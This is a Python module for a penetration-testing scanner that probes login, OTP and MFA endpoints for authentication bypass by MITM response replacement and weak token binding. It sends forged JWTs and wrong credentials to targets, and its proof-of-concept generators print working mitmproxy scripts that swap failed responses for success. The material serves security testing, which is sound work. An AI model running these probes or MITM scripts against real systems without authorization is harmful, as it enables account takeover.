"""
Jarwis AGI Pen Test - Response Manipulation Attack Scanner
Tests for authentication bypass via MITM response replacement

Attack Scenario:
1. Attacker captures successful login response (with JWT) from their own account
2. Attacker attempts login with victim's email but wrong password
3. Using MITM proxy, attacker intercepts the FAILED response
4. Attacker replaces failed response with captured SUCCESS response
5. Frontend thinks login succeeded and uses attacker's JWT
6. If server doesn't bind JWT to the specific login attempt, attacker gains access

This scanner tests for:
- Response manipulation vulnerabilities in login flows
- OTP bypass via response replacement
- Session/Token binding weaknesses
- Client-side only validation issues

OWASP Category: A07:2021 - Identification and Authentication Failures
"""

import asyncio
import logging
import re
import json
import time
import hashlib
import copy
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin
import aiohttp

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


@dataclass
class CapturedResponse:
    """Represents a captured HTTP response for replay"""
    url: str
    status_code: int
    headers: Dict[str, str]
    body: str
    json_body: Optional[Dict] = None
    is_success: bool = False
    tokens: Dict[str, str] = field(default_factory=dict)


class ResponseManipulationScanner:
    """
    Scans for Response Manipulation Attack vulnerabilities
    
    This attack works when:
    1. Server doesn't cryptographically bind tokens to specific auth attempts
    2. Frontend trusts response content without server validation
    3. JWT/session can be replayed across different user contexts
    
    Test Flow:
    1. Identify authentication endpoints (login, OTP, MFA)
    2. Analyze success vs failure response patterns
    3. Test if manipulated responses would be accepted
    4. Check for proper token-to-session binding
    5. Test OTP/MFA bypass via response manipulation
    """
    
    # Authentication endpoints to test
    AUTH_ENDPOINTS = [
        # Login endpoints
        ('/login', 'POST'),
        ('/signin', 'POST'),
        ('/auth/login', 'POST'),
        ('/api/auth/login', 'POST'),
        ('/api/login', 'POST'),
        ('/api/v1/auth/login', 'POST'),
        ('/authenticate', 'POST'),
        # OAuth token endpoints
        ('/oauth/token', 'POST'),
        ('/api/oauth/token', 'POST'),
        ('/token', 'POST'),
    ]
    
    # OTP/MFA endpoints
    OTP_ENDPOINTS = [
        ('/verify-otp', 'POST'),
        ('/otp/verify', 'POST'),
        ('/api/auth/verify-otp', 'POST'),
        ('/api/otp/verify', 'POST'),
        ('/mfa/verify', 'POST'),
        ('/api/mfa/verify', 'POST'),
        ('/2fa/verify', 'POST'),
        ('/api/2fa/verify', 'POST'),
        ('/auth/verify', 'POST'),
        ('/api/auth/verify', 'POST'),
    ]
    
    # Success indicators in responses
    SUCCESS_INDICATORS = [
        'token', 'access_token', 'accessToken', 'jwt',
        'session', 'sessionId', 'session_id',
        'success', 'authenticated', 'logged_in',
        'refresh_token', 'refreshToken', 'id_token',
        'user', 'profile', 'dashboard', 'welcome'
    ]
    
    # Failure indicators
    FAILURE_INDICATORS = [
        'error', 'failed', 'invalid', 'incorrect',
        'unauthorized', 'denied', 'wrong', 'mismatch',
        'expired', 'not found', 'bad credentials'
    ]
    
    # Token patterns to extract
    TOKEN_PATTERNS = [
        (r'"access_token"\s*:\s*"([^"]+)"', 'access_token'),
        (r'"accessToken"\s*:\s*"([^"]+)"', 'accessToken'),
        (r'"token"\s*:\s*"([^"]+)"', 'token'),
        (r'"jwt"\s*:\s*"([^"]+)"', 'jwt'),
        (r'"session"\s*:\s*"([^"]+)"', 'session'),
        (r'"sessionId"\s*:\s*"([^"]+)"', 'sessionId'),
        (r'"refresh_token"\s*:\s*"([^"]+)"', 'refresh_token'),
        (r'"id_token"\s*:\s*"([^"]+)"', 'id_token'),
    ]

    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = aiohttp.ClientTimeout(total=15)
        
        # Store captured responses for analysis
        self.captured_success_responses: List[CapturedResponse] = []
        self.captured_failure_responses: List[CapturedResponse] = []
        
    async def scan(self) -> List[ScanResult]:
        """Run response manipulation attack tests"""
        logger.info("Starting Response Manipulation Attack Scanner...")
        
        endpoints = getattr(self.context, 'endpoints', []) or []
        base_url = self.config.get('target', {}).get('url', '')
        
        if not base_url and endpoints:
            parsed = urlparse(endpoints[0] if isinstance(endpoints[0], str) else endpoints[0].get('url', ''))
            base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        if not base_url:
            logger.warning("No target URL found for response manipulation scanning")
            return self.results
        
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            # Phase 1: Discover and analyze auth endpoints
            auth_endpoints = await self._discover_auth_endpoints(session, base_url)
            
            # Phase 2: Capture and analyze response patterns
            await self._analyze_response_patterns(session, base_url, auth_endpoints)
            
            # Phase 3: Test for response manipulation vulnerabilities
            await self._test_response_manipulation(session, base_url, auth_endpoints)
            
            # Phase 4: Test OTP/MFA bypass
            await self._test_otp_bypass(session, base_url)
            
            # Phase 5: Test token binding
            await self._test_token_binding(session, base_url, auth_endpoints)
            
            # Phase 6: Test for client-side only validation
            await self._test_client_side_validation(session, base_url, auth_endpoints)
        
        logger.info(f"Response Manipulation Scanner completed. Found {len(self.results)} issues.")
        return self.results

    async def _discover_auth_endpoints(self, session: aiohttp.ClientSession, base_url: str) -> List[Tuple[str, str]]:
        """Discover available authentication endpoints"""
        discovered = []
        
        # Check predefined endpoints
        for endpoint, method in self.AUTH_ENDPOINTS + self.OTP_ENDPOINTS:
            url = urljoin(base_url, endpoint)
            try:
                # Use OPTIONS or GET to check if endpoint exists
                async with session.options(url) as response:
                    if response.status != 404:
                        discovered.append((endpoint, method))
                        continue
                
                # Try POST with empty body
                async with session.post(url, json={}) as response:
                    if response.status != 404:
                        discovered.append((endpoint, method))
                        
            except Exception as e:
                logger.debug(f"Endpoint discovery error for {url}: {e}")
            
            await asyncio.sleep(0.05)
        
        # Also check endpoints from context
        context_endpoints = getattr(self.context, 'endpoints', []) or []
        for ep in context_endpoints:
            ep_url = ep if isinstance(ep, str) else ep.get('url', '')
            if any(auth in ep_url.lower() for auth in ['login', 'auth', 'signin', 'otp', 'verify', 'mfa']):
                parsed = urlparse(ep_url)
                discovered.append((parsed.path, 'POST'))
        
        return list(set(discovered))

    async def _analyze_response_patterns(self, session: aiohttp.ClientSession, base_url: str, endpoints: List[Tuple[str, str]]):
        """Analyze success vs failure response patterns"""
        
        for endpoint, method in endpoints:
            if 'login' not in endpoint.lower() and 'auth' not in endpoint.lower():
                continue
                
            url = urljoin(base_url, endpoint)
            
            # Test with obviously wrong credentials to get failure response
            wrong_creds = [
                {'email': 'nonexistent@example.com', 'password': 'wrongpassword123'},
                {'username': 'nonexistent', 'password': 'wrongpassword123'},
            ]
            
            for creds in wrong_creds:
                try:
                    async with session.post(url, json=creds) as response:
                        body = await response.text()
                        
                        captured = CapturedResponse(
                            url=url,
                            status_code=response.status,
                            headers=dict(response.headers),
                            body=body,
                            is_success=False
                        )
                        
                        # Try to parse as JSON
                        try:
                            captured.json_body = json.loads(body)
                        except:
                            pass
                        
                        # Check if this looks like a failure
                        if self._is_failure_response(response.status, body):
                            self.captured_failure_responses.append(captured)
                            
                except Exception as e:
                    logger.debug(f"Response analysis error: {e}")
                
                await asyncio.sleep(0.1)

    def _is_success_response(self, status: int, body: str) -> bool:
        """Determine if response indicates successful authentication"""
        if status not in [200, 201]:
            return False
        
        body_lower = body.lower()
        
        # Check for success indicators
        has_success = any(ind in body_lower for ind in self.SUCCESS_INDICATORS)
        has_failure = any(ind in body_lower for ind in self.FAILURE_INDICATORS)
        
        return has_success and not has_failure

    def _is_failure_response(self, status: int, body: str) -> bool:
        """Determine if response indicates failed authentication"""
        if status in [401, 403]:
            return True
        
        body_lower = body.lower()
        return any(ind in body_lower for ind in self.FAILURE_INDICATORS)

    def _extract_tokens(self, body: str) -> Dict[str, str]:
        """Extract authentication tokens from response body"""
        tokens = {}
        
        for pattern, name in self.TOKEN_PATTERNS:
            match = re.search(pattern, body)
            if match:
                tokens[name] = match.group(1)
        
        return tokens

    async def _test_response_manipulation(self, session: aiohttp.ClientSession, base_url: str, endpoints: List[Tuple[str, str]]):
        """
        Test for response manipulation vulnerability
        
        Attack simulation:
        1. Send login with wrong password
        2. Analyze if replacing the response would work
        3. Check for server-side validation of session state
        """
        
        for endpoint, method in endpoints:
            if 'login' not in endpoint.lower() and 'signin' not in endpoint.lower():
                continue
                
            url = urljoin(base_url, endpoint)
            
            try:
                # Step 1: Send request with wrong credentials
                wrong_creds = {'email': 'victim@example.com', 'password': 'wrongpassword'}
                
                async with session.post(url, json=wrong_creds) as response:
                    failure_body = await response.text()
                    failure_status = response.status
                    
                    if not self._is_failure_response(failure_status, failure_body):
                        continue  # Need a failure to test manipulation
                
                # Step 2: Craft a fake "success" response
                fake_success = self._craft_fake_success_response()
                
                # Step 3: Check if there's any server-side state that would prevent this
                # We do this by checking if the server sets any binding cookies/headers
                
                vulnerabilities = []
                
                # Check 1: Does server set any session binding before auth?
                async with session.get(urljoin(base_url, endpoint.replace('login', '').rstrip('/'))) as pre_response:
                    pre_cookies = pre_response.cookies
                    
                # Check 2: Test if server validates session continuity
                # Send login request, then immediately check protected endpoint with fake token
                test_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ2aWN0aW1AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.fake"
                
                protected_endpoints = [
                    '/api/user/profile',
                    '/api/me',
                    '/api/auth/me',
                    '/dashboard',
                    '/api/dashboard',
                    '/profile',
                    '/api/user',
                ]
                
                for protected in protected_endpoints:
                    protected_url = urljoin(base_url, protected)
                    
                    async with session.get(
                        protected_url,
                        headers={'Authorization': f'Bearer {test_token}'}
                    ) as protected_response:
                        if protected_response.status == 200:
                            vulnerabilities.append(f"Protected endpoint {protected} accepts unverified token")
                        elif protected_response.status not in [401, 403, 404]:
                            vulnerabilities.append(f"Unexpected response from {protected}: {protected_response.status}")
                    
                    await asyncio.sleep(0.05)
                
                # Check 3: Analyze response structure for manipulation opportunities
                manipulation_risks = self._analyze_manipulation_risks(failure_body, fake_success)
                
                if manipulation_risks or vulnerabilities:
                    self.results.append(ScanResult(
                        id=f"RESP-MANIP-VULN-{len(self.results)}",
                        category="A07:2021",
                        severity="critical",
                        title="Potential Response Manipulation Vulnerability",
                        description="Authentication flow may be vulnerable to MITM response replacement attack",
                        url=url,
                        method="POST",
                        parameter="response body",
                        evidence=f"Risks: {manipulation_risks}. Issues: {vulnerabilities}",
                        remediation=self._get_remediation(),
                        cwe_id="CWE-287",
                        poc=self._generate_poc(url, wrong_creds, fake_success),
                        reasoning="Attacker can intercept failed login response and replace with captured success response"
                    ))
                    
            except Exception as e:
                logger.debug(f"Response manipulation test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    def _craft_fake_success_response(self) -> Dict:
        """Craft a fake successful authentication response"""
        return {
            "success": True,
            "message": "Login successful",
            "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.attacker_signature",
            "refresh_token": "fake_refresh_token_12345",
            "user": {
                "id": "attacker-id",
                "email": "attacker@example.com",
                "role": "user"
            }
        }

    def _analyze_manipulation_risks(self, failure_body: str, fake_success: Dict) -> List[str]:
        """Analyze response structure for manipulation opportunities"""
        risks = []
        
        try:
            failure_json = json.loads(failure_body)
            
            # Risk 1: Simple boolean success flag
            if 'success' in failure_json or 'status' in failure_json:
                risks.append("Response uses simple boolean success flag that can be flipped")
            
            # Risk 2: No cryptographic binding
            if 'challenge' not in failure_body.lower() and 'nonce' not in failure_body.lower():
                risks.append("No challenge/nonce binding between request and response")
            
            # Risk 3: Predictable response structure
            if set(failure_json.keys()).intersection({'success', 'error', 'message'}):
                risks.append("Response structure is predictable and easily replaceable")
                
        except json.JSONDecodeError:
            # Non-JSON response
            if 'error' in failure_body.lower() or 'failed' in failure_body.lower():
                risks.append("Simple text-based error that can be replaced with success page")
        
        return risks

    async def _test_otp_bypass(self, session: aiohttp.ClientSession, base_url: str):
        """
        Test for OTP/MFA bypass via response manipulation
        
        Attack: Submit wrong OTP, intercept response, replace with success
        """
        
        for endpoint, method in self.OTP_ENDPOINTS:
            url = urljoin(base_url, endpoint)
            
            try:
                # Check if endpoint exists
                async with session.post(url, json={'otp': '123456'}) as response:
                    if response.status == 404:
                        continue
                    
                    body = await response.text()
                    status = response.status
                
                # Test 1: Analyze OTP response structure
                vulnerabilities = []
                
                try:
                    json_body = json.loads(body)
                    
                    # Check for simple success/error structure
                    if 'verified' in json_body or 'success' in json_body or 'valid' in json_body:
                        vulnerabilities.append("OTP response uses simple boolean that can be manipulated")
                    
                    # Check for token in response
                    if any(key in json_body for key in ['token', 'access_token', 'session']):
                        vulnerabilities.append("OTP success returns token that can be captured and replayed")
                        
                except:
                    pass
                
                # Test 2: Check for OTP rate limiting (if no rate limit, easier to test)
                otp_attempts = 0
                for _ in range(5):
                    async with session.post(url, json={'otp': '000000'}) as resp:
                        if resp.status != 429:
                            otp_attempts += 1
                    await asyncio.sleep(0.02)
                
                if otp_attempts >= 5:
                    vulnerabilities.append("No rate limiting on OTP verification - easier to test manipulation")
                
                # Test 3: Check if OTP verification is bound to session
                # Try verifying without any session/context
                async with session.post(url, json={'otp': '123456', 'user_id': 'test'}) as unbound_resp:
                    unbound_body = await unbound_resp.text()
                    if unbound_resp.status == 200 and 'error' not in unbound_body.lower():
                        vulnerabilities.append("OTP verification may not be bound to authentication session")
                
                if vulnerabilities:
                    self.results.append(ScanResult(
                        id=f"OTP-RESP-MANIP-{len(self.results)}",
                        category="A07:2021",
                        severity="critical",
                        title="OTP Bypass via Response Manipulation",
                        description="OTP verification is vulnerable to response replacement attack",
                        url=url,
                        method="POST",
                        parameter="otp",
                        evidence=f"Vulnerabilities: {vulnerabilities}",
                        remediation="Bind OTP verification to session with server-side state. Use cryptographic challenges. Don't rely on client-side response parsing.",
                        cwe_id="CWE-287",
                        poc=self._generate_otp_poc(url),
                        reasoning="Attacker can submit wrong OTP, intercept failure response, replace with captured success response"
                    ))
                    
            except Exception as e:
                logger.debug(f"OTP bypass test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    async def _test_token_binding(self, session: aiohttp.ClientSession, base_url: str, endpoints: List[Tuple[str, str]]):
        """
        Test if tokens are properly bound to authentication attempts
        
        Vulnerability: Token from user A's session works for user B after response manipulation
        """
        
        for endpoint, method in endpoints:
            if 'login' not in endpoint.lower():
                continue
                
            url = urljoin(base_url, endpoint)
            
            try:
                # Step 1: Get a "legitimate" looking token structure
                # We simulate having captured this from our own account
                attacker_token = {
                    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInVzZXJfaWQiOiIxMjM0NSIsInJvbGUiOiJ1c2VyIn0.fake_sig",
                    "user_id": "12345",
                    "email": "attacker@example.com"
                }
                
                # Step 2: Try to access victim's data using attacker's token
                # This simulates what happens after response manipulation succeeds
                
                victim_endpoints = [
                    f'/api/users/99999/profile',  # Different user ID
                    f'/api/user?email=victim@example.com',
                    f'/api/account/victim@example.com',
                ]
                
                binding_issues = []
                
                for victim_ep in victim_endpoints:
                    victim_url = urljoin(base_url, victim_ep)
                    
                    headers = {
                        'Authorization': f'Bearer {attacker_token["access_token"]}',
                    }
                    
                    async with session.get(victim_url, headers=headers) as response:
                        if response.status == 200:
                            body = await response.text()
                            # Check if we got different user's data
                            if 'victim' in body.lower() or '99999' in body:
                                binding_issues.append(f"Token from user A accessed user B's data at {victim_ep}")
                    
                    await asyncio.sleep(0.05)
                
                # Step 3: Check for IDOR combined with response manipulation
                # After manipulating response to get "logged in" as victim,
                # check if attacker's token can access victim's resources
                
                if binding_issues:
                    self.results.append(ScanResult(
                        id=f"TOKEN-BINDING-WEAK-{len(self.results)}",
                        category="A07:2021",
                        severity="critical",
                        title="Weak Token-to-User Binding",
                        description="JWT tokens are not properly bound to user identity, enabling response manipulation attacks",
                        url=url,
                        method="GET",
                        parameter="Authorization",
                        evidence=f"Issues: {binding_issues}",
                        remediation="Bind tokens cryptographically to user sessions. Validate token claims server-side for every request.",
                        cwe_id="CWE-287",
                        poc="Use token from account A to access account B's resources",
                        reasoning="If tokens aren't bound, attacker can manipulate login response to use their token with victim's session"
                    ))
                    
            except Exception as e:
                logger.debug(f"Token binding test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    async def _test_client_side_validation(self, session: aiohttp.ClientSession, base_url: str, endpoints: List[Tuple[str, str]]):
        """
        Test if authentication relies on client-side response parsing
        
        Vulnerability: Frontend trusts response content without server verification
        """
        
        for endpoint, method in endpoints:
            if 'login' not in endpoint.lower():
                continue
                
            url = urljoin(base_url, endpoint)
            
            try:
                # Test with wrong credentials
                wrong_creds = {'email': 'test@test.com', 'password': 'wrongpassword'}
                
                async with session.post(url, json=wrong_creds) as response:
                    failure_body = await response.text()
                    failure_status = response.status
                    failure_headers = dict(response.headers)
                
                if failure_status in [200, 201]:
                    # Server returned 200 even for wrong creds - check response content
                    try:
                        json_body = json.loads(failure_body)
                        
                        # Check if success is determined by response content, not status
                        if 'success' in json_body and json_body.get('success') == False:
                            self.results.append(ScanResult(
                                id=f"CLIENT-SIDE-AUTH-{len(self.results)}",
                                category="A07:2021",
                                severity="high",
                                title="Client-Side Authentication Validation",
                                description="Server returns 200 OK for failed login, relying on response body for success/failure. This enables response manipulation.",
                                url=url,
                                method="POST",
                                parameter="response body",
                                evidence=f"Server returned 200 with success=false. Response: {failure_body[:200]}",
                                remediation="Use proper HTTP status codes (401 for failed auth). Don't rely solely on response body content.",
                                cwe_id="CWE-603",
                                poc="Server returns 200 OK for failed login - MITM can change response body",
                                reasoning="200 OK responses are cached and easier to manipulate; proper 401 status codes are harder to fake"
                            ))
                        
                        # Check if error is only in response body
                        if 'error' in json_body or 'message' in json_body:
                            if failure_status == 200:
                                self.results.append(ScanResult(
                                    id=f"RESPONSE-BODY-AUTH-{len(self.results)}",
                                    category="A07:2021",
                                    severity="high",
                                    title="Authentication Status in Response Body Only",
                                    description="Authentication success/failure is indicated only in response body, not HTTP status",
                                    url=url,
                                    method="POST",
                                    parameter="response body",
                                    evidence=f"Status 200 with error in body: {failure_body[:200]}",
                                    remediation="Use HTTP 401/403 for authentication failures. Implement server-side session state verification.",
                                    cwe_id="CWE-603",
                                    poc="Change response body from error to success via MITM",
                                    reasoning="Body-only auth status can be manipulated by MITM proxy"
                                ))
                                
                    except json.JSONDecodeError:
                        pass
                
                # Check for redirect-based auth
                if failure_status in [302, 307]:
                    location = failure_headers.get('Location', '')
                    if 'login' in location or 'error' in location:
                        # Redirect to login/error on failure
                        # Check if redirect can be manipulated
                        self.results.append(ScanResult(
                            id=f"REDIRECT-AUTH-{len(self.results)}",
                            category="A07:2021",
                            severity="medium",
                            title="Redirect-Based Authentication",
                            description="Authentication failure triggers redirect. MITM can change redirect target.",
                            url=url,
                            method="POST",
                            parameter="Location header",
                            evidence=f"Failure redirect to: {location}",
                            remediation="Use server-side session validation. Don't rely on client-side redirect handling.",
                            cwe_id="CWE-601",
                            poc=f"Change Location header from '{location}' to '/dashboard'",
                            reasoning="Redirect targets can be changed by MITM proxy"
                        ))
                        
            except Exception as e:
                logger.debug(f"Client-side validation test error: {e}")
            
            await asyncio.sleep(1 / self.rate_limit)

    def _get_remediation(self) -> str:
        """Get comprehensive remediation advice"""
        return """
1. **Cryptographic Binding**: Generate a unique challenge/nonce for each authentication attempt. 
   Include it in the response and validate server-side.

2. **Server-Side Session State**: Maintain authentication state on server. Don't rely on 
   client parsing of response to determine logged-in status.

3. **Proper HTTP Status Codes**: Use 401 Unauthorized for failed auth, not 200 OK with error message.

4. **Token Fingerprinting**: Bind tokens to client fingerprint (IP, User-Agent hash, TLS session).

5. **Response Signing**: Sign critical responses with HMAC. Client can verify authenticity.

6. **Challenge-Response**: Implement challenge-response mechanism where client must prove 
   knowledge of something only received in the specific auth flow.

7. **Certificate Pinning**: For mobile apps, implement certificate pinning to prevent MITM.

8. **Token Claims Validation**: Validate JWT claims (sub, aud, iss) match expected values for 
   the authenticated user on every request.
"""

    def _generate_poc(self, url: str, creds: Dict, fake_success: Dict) -> str:
        """Generate proof of concept for the attack"""
        return f"""
# Response Manipulation Attack PoC

## Step 1: Capture Success Response (from attacker's own account)
# Login to your own account and capture the successful response
curl -X POST {url} \\
  -H 'Content-Type: application/json' \\
  -d '{{"email":"attacker@example.com","password":"attacker_password"}}' \\
  -o success_response.json

## Step 2: Setup MITM Proxy (mitmproxy example)
# mitm_script.py
from mitmproxy import http
import json

def response(flow: http.HTTPFlow):
    if "login" in flow.request.url:
        # Check if this is a failed login
        if "error" in flow.response.text or flow.response.status_code == 401:
            # Replace with captured success response
            with open('success_response.json') as f:
                success = f.read()
            flow.response.text = success
            flow.response.status_code = 200
            print("[*] Replaced failed login with success!")

# Run: mitmproxy -s mitm_script.py

## Step 3: Victim's Login Attempt
# Victim attempts login with their email but wrong/no password
# MITM intercepts and replaces response
# Frontend receives "success" and stores attacker's token
# Attacker now has session as victim (frontend thinks victim is logged in)

## Original Request (Victim's):
POST {url}
{json.dumps(creds, indent=2)}

## Original Response (Failure):
HTTP/1.1 401 Unauthorized
{{"error": "Invalid credentials"}}

## Manipulated Response (MITM Replaced):
HTTP/1.1 200 OK
{json.dumps(fake_success, indent=2)}

## Result: Frontend stores attacker's token, victim "session" is compromised
"""

    def _generate_otp_poc(self, url: str) -> str:
        """Generate OTP bypass proof of concept"""
        return f"""
# OTP Bypass via Response Manipulation PoC

## Step 1: Capture OTP Success Response
# Complete legitimate OTP verification and capture response
curl -X POST {url} \\
  -H 'Content-Type: application/json' \\
  -d '{{"otp":"123456"}}' \\
  -o otp_success.json

## Step 2: MITM Script for OTP Bypass
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "otp" in flow.request.url or "verify" in flow.request.url:
        if "error" in flow.response.text or "invalid" in flow.response.text.lower():
            # Replace failed OTP with success
            flow.response.text = open('otp_success.json').read()
            flow.response.status_code = 200
            print("[*] OTP bypass - replaced failure with success!")

## Step 3: Attack
# Submit any OTP (wrong or guessed)
# MITM replaces failure response with captured success
# Frontend proceeds as if OTP was correct
# Account is compromised without knowing actual OTP
"""


# Export for scanner registration
__all__ = ['ResponseManipulationScanner', 'ScanResult']
